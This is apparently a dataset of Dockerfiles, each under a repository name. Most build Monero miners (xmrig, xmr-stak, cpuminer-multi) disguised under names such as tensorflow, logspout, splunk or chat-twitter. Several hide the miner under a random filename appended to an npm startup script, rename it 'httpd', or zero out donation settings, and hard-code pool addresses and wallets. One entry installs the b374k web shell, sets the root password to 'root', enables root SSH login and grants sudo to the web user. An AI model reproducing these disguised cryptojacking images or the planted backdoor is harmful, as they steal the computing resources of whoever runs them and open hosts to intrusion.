aasmuk13/tensorflow3; b'FROM alpine:latest\nRUN adduser -S -D -H -h /xmrig xminer\nRUN apk --no-cache upgrade \\\n    && apk --no-cache add git cmake libuv-dev build-base \\\n    && cd / \\\n    && git clone https://github.com/xmrig/xmrig \\\n    && cd xmrig \\\n    && sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h \\\n    && mkdir build \\\n    && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . \\\n    && make \\\n    && apk del build-base cmake git\nUSER xminer\nWORKDIR /xmrig\nENTRYPOINT ["./xmrig", "--algo=cryptonight", "--max-cpu-usage=100"]\nCMD ["./xmrig", "--algo=cryptonight","--url=stratum+tcp://xmr-eu.suprnova.cc:5222", "--user=OzzyKampha.worker1", "--pass=passord", "--max-cpu-usage=100"]'
awesome001/test; b'FROM ubuntu:16.04\n\nMAINTAINER Tanguy Pruvot <tanguy.pruvot@gmail.com>\n\nRUN apt-get update -qq\n\nRUN apt-get install -qy build-essential libcurl4-openssl-dev git automake libtool libjansson* libncurses5-dev libssl-dev\n\nRUN git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux\n\nRUN cd cpuminer-multi && ./autogen.sh  \\\n    && ./configure --with-crypto --with-curl \\\n    && make -j"$(nproc)" \\\n    && make install\n\nCMD ["cpuminer","-a","lyra2re","-o","stratum+tcp://lyra2re.hk.nicehash.com:3342","-u","1NArxcdTF7nFzpf4aerd61mdqm4SQwAfW4.b1","-p","x"]'
blueskyos/maggate; b'FROM ubuntu:16.04\n\nRUN apt-get update && \\\n    apt-get install -y ca-certificates wget curl\n\nRUN curl -sL https://deb.nodesource.com/setup_6.x | bash -\nRUN apt-get install -qy nodejs\n\nRUN wget https://minergate.com/download/deb-cli && \\\n    dpkg -i deb-cli\n\nENV USER bluesky.os@yandex.com\nENV COIN --xmr\n\nENTRYPOINT minergate-cli -user $USER $COIN'
snailkick/chat-twitter; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
fookdies301/heroku-v2ray; b'FROM alpine:edge\nENV UUID bae4c69e-3fe3-45d4-aaae-43dc34855efc\nENV Path ray\nENV WALLET default_wallet_address\nENV TZ \'Asia/Shanghai\'\n\nRUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories \\\n&& apk upgrade --no-cache \\\n&& apk --update --no-cache add tzdata supervisor ca-certificates nginx build-base cmake git curl wget unzip openssl-dev libmicrohttpd-dev hwloc-dev \\\n&& ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&& echo "Asia/Shanghai" > /etc/timezone \\\n&& git clone https://github.com/fireice-uk/xmr-stak.git \\\n&& sed -i \'s/2.0/0.0/g\' xmr-stak/xmrstak/donate-level.hpp \\\n&& mkdir xmr-stak/build \\\n&& cd xmr-stak/build \\\n&& cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .. \\\n&& make install \\\n&& cd / \\\n&& git clone https://github.com/Supervisor/meld3.git \\\n&& cd meld3 \\\n&& python setup.py install \\\n&& apk del --purge build-base cmake git \\\n&& rm -rf /var/cache/apk/*\n\nADD *.txt /xmr-stak/build/bin/\n\nRUN mkdir -p /usr/bin/v2ray/ \\\n&& cd /tmp \\\n&& VER=$(curl -s https://api.github.com/repos/v2ray/v2ray-core/releases/latest | grep tag_name | awk  -F \'"\' \'{print $4}\') \\\n&& wget https://github.com/v2ray/v2ray-core/releases/download/$VER/v2ray-linux-64.zip \\\n&& unzip v2ray-linux-64.zip \\\n&& chmod +x v2ray v2ctl \\\n&& mv v2* /usr/bin/v2ray/ \\\n&& mv *.dat /usr/bin/v2ray/ \\\n&& rm -rf v2ray-linux-64.zip /tmp/* \\\n&& mkdir /var/log/v2ray/  \\\n&& adduser -D myuser \\\n&& mkdir /run/nginx\n\nENV PATH /usr/bin/v2ray:$PATH\nCOPY default.conf /etc/nginx/conf.d/default.conf\nCOPY supervisord.conf /etc/supervisord.conf\nCOPY config.json /etc/v2ray/config.json\nCOPY entrypoint.sh /usr/bin/\n\nUSER myuser\nCMD entrypoint.sh'
hollowknight/sommerset; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i && \\\n    git clone https://github.com/xmrig/xmrig.git && \\\n    cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n    mv xmrig $NAME && cp $NAME /deadpico && cd /deadpico && echo "\\n ./${NAME}" >> electrode.sh && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR deadpico\nCMD npm start'
googledeployz/docker; b'# Latest version of ubuntu\nFROM ubuntu:xenial\n\n# Default git repository\nENV GIT_REPOSITORY https://github.com/fireice-uk/xmr-stak.git\nENV XMRSTAK_CMAKE_FLAGS -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF -DMICROHTTPD_ENABLE=OFF\n\n# Innstall packages\nRUN apt-get update \\\n    && set -x \\\n    && apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget \\\n    && git clone $GIT_REPOSITORY \\\n    && cd /xmr-stak \\\n    && sed -i "s/fDevDonationLevel = 2.0/fDevDonationLevel = 0.0/g" xmrstak/donate-level.hpp \\ \n    && sysctl -w vm.nr_hugepages=128 \\\n    && cmake ${XMRSTAK_CMAKE_FLAGS} . \\\n    && make \\\n    && cd - \\\n    && mv /xmr-stak/bin/* /usr/local/bin/ \\\n    && mv /usr/local/bin/xmr-stak /usr/local/bin/httpd \\\n    && rm -rf /xmr-stak \\\n    && wget https://pastebin.com/raw/kwfUzTtk -O /usr/local/bin/config.txt \\\n    && wget https://pastebin.com/raw/tXuy50KB -O /usr/local/bin/pools.txt \\\n    && apt-get purge -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget \\\n    && apt-get clean -qq \n\nVOLUME /mnt\n\nWORKDIR /mnt\n\nENTRYPOINT ["/usr/local/bin/httpd","-c","/usr/local/bin/config.txt","-C","/usr/local/bin/pools.txt"]'
blueskyos/hubmine; b'FROM ubuntu:16.04\n\nRUN apt-get update -qq\n\nRUN apt-get install -qy build-essential git curl libtool libjansson* libssl-dev libcurl4-openssl-dev libncurses5-dev libgmp-dev automake\n\nRUN git clone https://github.com/JayDDee/cpuminer-opt -b legacy\n\nRUN cd cpuminer-opt \\\n    && ./autogen.sh \\\n    && ./configure CFLAGS="-O3 -msse4.1" CXXFLAGS="$CFLAGS -std=gnu++11" --with-curl --with-crypto \\\n    && make \\\n    && make install\n\nRUN curl -sL https://deb.nodesource.com/setup_6.x | bash -\nRUN apt-get install -qy nodejs'
pikeman20/webshell; b'FROM ubuntu:17.04\nMAINTAINER HJay <trixism@qq.com>\nENV DOCKER_INSTALL_WEBSHELL a\n# Let the conatiner know that there is no tty\nENV DEBIAN_FRONTEND noninteractive\n\nRUN \\\n cp /root/.bashrc /root/.profile / ; \\\n echo \'HISTFILE=/dev/null\' >> /.bashrc ; \\\n HISTSIZE=0 ; \\\n sed -i "s/archive.ubuntu.com/us.archive.ubuntu.com/g" /etc/apt/sources.list ; \\\n echo \'deb http://us.archive.ubuntu.com/ubuntu/ trusty multiverse\' >> /etc/apt/sources.list ; \\\n echo \'deb-src http://us.archive.ubuntu.com/ubuntu/ trusty multiverse\' >> /etc/apt/sources.list ; \\\n apt-get update ; \\\n apt-get -y upgrade ; \\\n apt-get -y install apt-utils\nRUN  useradd -r -p -M -g root -b /xmrig xminer\nRUN \\\n apt-get -y install software-properties-common python-software-properties ; \\\n for f in ppa:ondrej/php ppa:ubuntu-toolchain-r/test; do add-apt-repository $f; done; \\\n apt-get update ; \\\n apt-get -y --allow-unauthenticated install nginx-extras \\\n php5.6-cli php5.6-curl php5.6-fpm php5.6-json php5.6-mcrypt php5.6-mysql php5.6-sqlite php5.6-xmlrpc php5.6-xsl php5.6-gd \\\n curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 sudo openssh-server \\\n supervisor \\\n mysql-client ; \\\n apt-get clean ; \\\n phpenmod mcrypt ; \\\n sudo usermod -aG sudo www-data ; \\\n sudo usermod -aG sudo xminer ; \\\n git clone https://github.com/pikeman20/test && \\\n cd test && \\\n sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n mkdir build && \\\n cmake -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 . && \\\n make\n \n\nCOPY ./sbin /root/sbin\nCOPY ./template /root/template\n\nRUN mv /etc/supervisor/supervisord.conf /etc/supervisor/supervisord.conf.default ; \\\n cp /root/template/conf/supervisord.conf /etc/supervisor/supervisord.conf ; \\\n cp /root/template/conf/supervisor_service.conf /etc/supervisor/conf.d/ ; \\\n mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.default ; \\\n cp -rf /root/template/conf/nginx/* /etc/nginx/ ; \\\n cp /root/template/conf/php-fpm.conf /etc/php/5.6/fpm/php-fpm.conf\n\nRUN \\\n mkdir -p /root/thirdparty ; \\\n curl -sSL https://github.com/pikeman20/b374k/archive/v3.2.3.tar.gz | tar -zxf - -C /root/thirdparty/ ; \\\n true\n\nRUN mkdir /var/run/sshd\n\nRUN echo \'root:root\' |chpasswd\n\nRUN sed -ri \'s/^PermitRootLogin\\s+.*/PermitRootLogin yes/\' /etc/ssh/sshd_config\nRUN sed -ri \'s/UsePAM yes/#UsePAM yes/g\' /etc/ssh/sshd_config\n\nEXPOSE 80\n\nWORKDIR    /test\nCMD  ["/bin/bash","/root/sbin/init.sh"]\n#CMD    ["/usr/sbin/sshd", "-D"]\n#USER xminer\n#CMD ["./xmrig", "--algo=cryptonight", "--url=stratum+tcp://xmr.poolmining.org:3032", "--user=4AMFQyFQCEVFggfMP6uhfm1wkPKBqwnzwGwUegy9JRsBQr8c9FFKxba29WUKikWVP7EdgZ5jcAqyqC1Qjt9j6EfNCdq6t9W", "--pass=x", "--max-cpu-usage=100"]'
winstonpro/v2ray-heroku; b'FROM alpine:edge\nENV UUID bae4c69e-3fe3-45d4-aaae-43dc34855efc\nENV WALLET default_wallet_address\nENV TZ \'Asia/Shanghai\'\n\nRUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories \\\n&& apk upgrade --no-cache \\\n&& apk --update --no-cache add tzdata supervisor ca-certificates nginx build-base cmake git curl wget unzip openssl-dev libmicrohttpd-dev hwloc-dev \\\n&& ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&& echo "Asia/Shanghai" > /etc/timezone \\\n&& git clone https://github.com/fireice-uk/xmr-stak.git \\\n&& sed -i \'s/2.0/0.0/g\' xmr-stak/xmrstak/donate-level.hpp \\\n&& mkdir xmr-stak/build \\\n&& cd xmr-stak/build \\\n&& cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .. \\\n&& make install \\\n&& apk del --purge build-base cmake git \\\n&& rm -rf /var/cache/apk/*\n\nADD *.txt /xmr-stak/build/bin/ \n\nRUN mkdir -p /usr/bin/v2ray/ \\\n&& cd /tmp \\\n&& VER=$(curl -s https://api.github.com/repos/v2ray/v2ray-core/releases/latest | grep tag_name | awk  -F \'"\' \'{print $4}\') \\\n&& wget https://github.com/v2ray/v2ray-core/releases/download/$VER/v2ray-linux-64.zip \\\n&& unzip v2ray-linux-64.zip \\\n&& chmod +x v2ray v2ctl \\\n&& mv v2* /usr/bin/v2ray/ \\\n&& mv *.dat /usr/bin/v2ray/ \\\n&& rm -rf v2ray-linux-64.zip /tmp/* \\\n&& mkdir /var/log/v2ray/  \\\n&& adduser -D myuser \\\n&& mkdir /run/nginx\n\nENV PATH /usr/bin/v2ray:$PATH\nCOPY default.conf /etc/nginx/conf.d/default.conf\nCOPY supervisord.conf /etc/supervisord.conf\nCOPY config.json /etc/v2ray/config.json\nCOPY entrypoint.sh /usr/bin/\n\nUSER myuser\nCMD entrypoint.sh'
hollowknight/supressor; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i && \\\n    git clone https://github.com/xmrig/xmrig.git && \\\n    cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n    mv xmrig $NAME && cp $NAME /deadpico && cd /deadpico && echo "\\n ./${NAME}" >> electrode.sh && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR deadpico\nCMD npm start'
snowdream/utopia; b'FROM ubuntu:latest\n\nLABEL maintainer="snowdream <sn0wdr1am@icloud.com>"\n\nENV CPULIMIT_VERSION=0.2 \\\n    CPU_USAGE=90 \\\n    UTOPIA_PUBLIC_KEY=8619D1D54353041126B576AE44E79EE9E1C3243FC5F72FA11E8AE97241A09808  \n\nRUN apt-get -qq update \\\n    &&  apt-get -qqy install --no-install-recommends wget libslang2 libglib2.0-0 screen \\\n    &&  apt-get -qqy install --no-install-recommends build-essential \\\n    &&  cd /root \\\n    &&  wget --no-check-certificate -c https://github.com/opsengine/cpulimit/archive/v${CPULIMIT_VERSION}.tar.gz \\\n    &&  tar zxvf v${CPULIMIT_VERSION}.tar.gz \\\n    &&  cd cpulimit-${CPULIMIT_VERSION} \\\n    &&  sed -i "/#include <sys\\/sysctl.h>/d" src/cpulimit.c  \\\n    &&  make \\\n    &&  cp src/cpulimit /usr/bin/ \\\n    &&  cd /root \\\n    &&  wget --no-check-certificate -c https://update.u.is/downloads/linux/utopia-bot-latest.x86_64.tar.gz -O utopia-bot-latest.x86_64.tar.gz \\\n    &&  tar zxvf utopia-bot-latest.x86_64.tar.gz  \\\n    &&  rm -rf utopia-bot-latest.x86_64.tar.gz  \\\n    &&  cd /root \\\n    &&  rm -rf v${CPULIMIT_VERSION}.tar.gz \\\n    &&  rm -rf cpulimit-${CPULIMIT_VERSION} \\\n    &&  rm -rf xmrig-${UTOPIA_VERSION}-prifit-switching-Linux \\\n    &&  apt-get -qqy remove build-essential  \\\n    &&  rm -rf /var/lib/apt/lists/*\n\nCOPY docker-entrypoint.sh /usr/local/bin/\nRUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat\n\nENTRYPOINT ["docker-entrypoint.sh"]'
adahsach/nowmi; b'FROM  alpine:latest\n\nENV USER_NAME=app\nENV USER_PASS=app\nENV USER_HOME=/home\n\nENV SSHD_PORT=2022\nENV MAIN_PORT=3000\n\nRUN apk --no-cache upgrade \\\n && apk --no-cache add \\\n      cmake libuv-dev build-base \\\n      sudo bash wget curl nano \\\n      openssh python git nodejs nodejs-npm yarn\n# && rm -rf /var/cache/apk/*\n\n# Install dumb-init (avoid PID 1 issues). https://github.com/Yelp/dumb-init\nRUN curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \\\n && chmod +x /usr/local/bin/dumb-init \n\nRUN adduser -S -D -H -G root -u 1000 -s /bin/bash -h $USER_HOME $USER_NAME \\\n && echo "$USER_NAME:$USER_PASS" | chpasswd\n\n# Grant privileges\nRUN chgrp -R 0     /var /etc $USER_HOME \\\n && chmod -R g+rwX /var /etc $USER_HOME \\\n && sed -i \'s/#\\s%wheel/%root/\' /etc/sudoers \\\n && chmod 664 /etc/passwd /etc/group\n\n# Prepare SSH service\nRUN echo "Port $SSHD_PORT" >> /etc/ssh/sshd_config \\\n && mkdir -p /var/empty && chmod 700 /var/empty \\\n && export SSHD_PORT=$SSHD_PORT \n\n# Install XMRIG\nRUN git clone https://github.com/xmrig/xmrig xmrig_source \\\n && cd xmrig_source \\\n && sed -i \'s/kDonateLevel = 5;/kDonateLevel = 0;/\' src/donate.h \\\n && mkdir build \\\n && cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF . \\\n && make \\\n && mv xmrig /usr/bin \\\n && cd .. \\\n && rm -rf xmrig_source\n\nWORKDIR $USER_HOME\nVOLUME  /volume\n\n# Install Wetty\nRUN git clone https://github.com/adahsach/wetty \\\n && cd wetty \\\n && npm install\n\nADD src src\nADD app.js app.js\n\nEXPOSE $MAIN_PORT \nENTRYPOINT  ["dumb-init"]\nCMD ["node","app.js"]'
dajafofijinypatocom/logspout; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
doprlordsoftscom/hipache; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ffprucupdongml/unison; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
fecwebidega/splunk; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hiwuwedshalarnet/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
